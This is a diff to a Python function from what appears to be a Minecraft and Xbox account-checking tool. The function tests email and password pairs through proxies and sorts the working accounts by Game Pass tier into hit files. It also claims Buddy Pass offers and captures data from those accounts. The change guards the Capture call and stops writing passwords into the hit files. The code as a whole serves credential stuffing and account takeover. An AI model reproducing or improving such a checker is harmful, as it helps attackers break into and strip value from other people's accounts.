@@ -128,31 +128,32 @@ def checkmc(session, email, password, token, xbox_token, config, proxylist, maxr
             pass
 
         capes_str = ', '.join(capes_list)
-        try:
-            capture = Capture(email, password, name, capes_str, uuid_str, token, acctype, session)
-            if 'Game Pass' not in acctype:
-                capture.handle(session)
-        except Exception as e:
-            if UI_ENABLED and ui:
-                ui.log_error(f"Capture error: {e}")
+        if Capture is not None:
+            try:
+                capture = Capture(email, password, name, capes_str, uuid_str, token, acctype, session)
+                if 'Game Pass' not in acctype:
+                    capture.handle(session)
+            except Exception as e:
+                if UI_ENABLED and ui:
+                    ui.log_error(f"Capture error: {e}")
 
         if acctype in ('Xbox Game Pass Ultimate', 'Normal Minecraft (with Game Pass Ultimate)'):
             with stats_lock:
                 xgpu_ref[0] += 1
-            write_dedupe(fname, 'XboxGamePassUltimate.txt', f'{email}:{password}\n')
+            write_dedupe(fname, 'XboxGamePassUltimate.txt', f'{email}\n')
             claim_buddypass_offers(session, xbox_token, fname)
             capture_mc(token, session, email, password, acctype)
             return True
         elif acctype in ('Xbox Game Pass (PC)', 'Normal Minecraft (with Game Pass)'):
             with stats_lock:
                 xgp_ref[0] += 1
-            write_dedupe(fname, 'XboxGamePass.txt', f'{email}:{password}\n')
+            write_dedupe(fname, 'XboxGamePass.txt', f'{email}\n')
             if 'Normal' in acctype:
-                write_dedupe(fname, 'Normal.txt', f'{email}:{password}\n')
+                write_dedupe(fname, 'Normal.txt', f'{email}\n')
             claim_buddypass_offers(session, xbox_token, fname)
             return True
         elif acctype == 'Normal Minecraft':
-            write_dedupe(fname, 'Normal.txt', f'{email}:{password}\n')
+            write_dedupe(fname, 'Normal.txt', f'{email}\n')
             return True
 
     return False
